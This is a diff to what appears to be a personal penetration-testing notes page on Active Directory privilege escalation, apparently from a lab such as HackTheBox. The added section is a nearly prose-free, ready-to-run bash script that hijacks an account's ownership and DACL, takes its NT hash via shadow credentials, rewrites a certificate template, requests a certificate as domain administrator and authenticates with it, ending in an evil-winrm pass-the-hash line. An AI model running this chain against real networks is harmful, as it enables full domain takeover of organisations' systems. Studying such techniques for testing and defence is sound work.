@@ -10,6 +10,7 @@ title: AD Privilege Escalation
 - [certipy](https://github.com/ly4k/Certipy)
 
 ## Certificate Authority stuff
+- [whitepaper on ESC](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 
 ```bash
 certipy-ad find -u my_user -p my_password123 -dc-ip 10.10.10.10
@@ -71,3 +72,38 @@ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain $thet
 python psexec.py -hashes hhhhhhhh:hhhhhhhhh administrator@xxxx.com
 ```
 
+## Another ESC like exploit
+
+We found a certificate configuration that grants one of our users 
+
+```bash
+certipy-ad find -dc-ip $the_ip -target $the_dc -enabled -username $the_user -p $the_password
+```
+
+```bash
+#!/bin/bash
+
+export the_ip=10.129.2.81
+export the_dc='DC01.xxx.yyy'
+export the_ca='xxx-DC01-CA'
+export the_domain='xxx.yyy'
+export the_user='user-that-i-have-access-to'
+export the_password='the-password-of-that-user'
+export the_ca_user='the-user-which-has-full-rights-on-the-template'
+export the_admin='administrator'
+export the_admin_at='administrator@xxx.yyy'
+export KRB5CCNAME="$PWD/$the_ca_user.ccache"
+export the_vulnerable_template='the-vulnerable-template'
+
+# Give Full Control over to the less permissioned user
+bloodyAD --host $the_dc -d $the_domain -u $the_user -p $the_password set owner $the_ca_user $the_user
+impacket-dacledit -action 'write' -rights 'FullControl' -principal $the_user -target $the_ca_user "$the_domain/$the_user:$the_password"
+
+# Authenticate 
+hash1=$(certipy-ad shadow auto -u "$the_user@$the_domain" -p $the_password -dc-ip $the_ip -target $the_dc -account $the_ca_user | awk '/NT hash for / {print $NF}' | tail -n 1)
+certipy-ad template -k -template $the_vulnerable_template -target $the_dc -dc-ip $the_ip
+certipy-ad req -u $the_ca_user -hashes $hash1 -ca $the_ca -target $the_dc -dc-ip $the_ip -template $the_vulnerable_template -upn $the_admin_at
+certipy-ad auth -pfx "./$the_admin.pfx" -dc-ip $the_ip 
+
+# evil-winrm -i $the_dc -u administrator -H <hash-from-last-step> 
+```
